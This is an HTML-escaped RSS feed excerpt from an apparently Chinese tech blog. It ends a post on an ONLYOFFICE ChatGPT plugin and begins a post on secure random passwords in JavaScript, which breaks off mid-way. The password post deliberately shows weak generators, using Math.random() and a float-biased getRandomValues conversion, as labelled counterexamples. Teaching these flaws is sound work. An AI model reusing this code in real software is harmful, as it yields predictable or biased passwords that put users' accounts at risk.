&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;checkApiKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ApiKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;localStorage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getItem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;OpenAIApiKey&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;bHasKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ApiKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getContextMenuItems&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;guid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Asc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;guid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ChatGPT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generateText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ChatGPT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;4-多语言支持&#34;&gt;4. 多语言支持
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;translations/&lt;/code&gt;目录包含各语言JSON文件，通过&lt;code&gt;onTranslate()&lt;/code&gt;方法实现动态本地化&lt;/p&gt;
&lt;h3 id=&#34;5-第三方依赖&#34;&gt;5. 第三方依赖
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;vendor/&lt;/code&gt;目录包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenAI编码器&lt;/li&gt;
&lt;li&gt;Select2 UI库&lt;/li&gt;
&lt;li&gt;jQuery基础文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;功能实现细节&#34;&gt;功能实现细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;API密钥验证&lt;/strong&gt;：通过&lt;code&gt;settings.js&lt;/code&gt;实现密钥校验&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上下文菜单&lt;/strong&gt;：动态生成AI功能选项&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;聊天交互&lt;/strong&gt;：&lt;code&gt;chat.js&lt;/code&gt;处理对话逻辑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误处理&lt;/strong&gt;：专用JS文件管理异常场景&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 消息创建逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;createMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chat&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;chat&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;loading&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// ...消息渲染逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该技术方案展示了如何通过标准API将AI能力嵌入办公软件，开发者可参照此模式集成其他AI服务。完整代码已开源在&lt;a class=&#34;link&#34; href=&#34;https://github.com/ONLYOFFICE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用JavaScript生成安全随机密码的终极指南</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8javascript%E7%94%9F%E6%88%90%E5%AE%89%E5%85%A8%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81%E7%9A%84%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 22:45:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8javascript%E7%94%9F%E6%88%90%E5%AE%89%E5%85%A8%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81%E7%9A%84%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;如何使用javascript创建安全的随机密码&#34;&gt;如何使用JavaScript创建安全的随机密码
&lt;/h1&gt;&lt;p&gt;最近我在编写JavaScript代码时需要生成随机密码，但惊讶地发现很难找到正确的实现方法。Google、StackOverflow甚至ChatGPT提供的大多数方案都存在各种缺陷。&lt;/p&gt;
&lt;h2 id=&#34;常见错误方案分析&#34;&gt;常见错误方案分析
&lt;/h2&gt;&lt;h3 id=&#34;错误示例1使用mathrandom&#34;&gt;错误示例1：使用Math.random()
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* 弱随机数生成器示例，切勿使用 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chars&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&amp;amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwordLength&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwordLength&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MDN文档明确指出：&lt;code&gt;Math.random()&lt;/code&gt;不提供密码学安全的随机数，任何安全相关场景都应使用Web Crypto API的&lt;code&gt;window.crypto.getRandomValues()&lt;/code&gt;方法。&lt;/p&gt;
&lt;h3 id=&#34;错误示例2浮点数转换偏差&#34;&gt;错误示例2：浮点数转换偏差
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* 存在浮点数舍入偏差的示例，切勿使用 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generatePassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generatedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validChars&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.-{}+!\&amp;#34;#$%/()=?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;crypto&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getRandomValues&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Uint32Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validChars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;generatedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validChars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;randomNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generatedPassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此方案虽然使用了安全的&lt;code&gt;crypto.getRandomValues()&lt;/code&gt;，但通过浮点数转换会引入不均匀分布问题。&lt;/p&gt;
&lt;h3 id=&#34;错误示例3模偏差问题&#34;&gt;错误示例3：模偏差问题
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
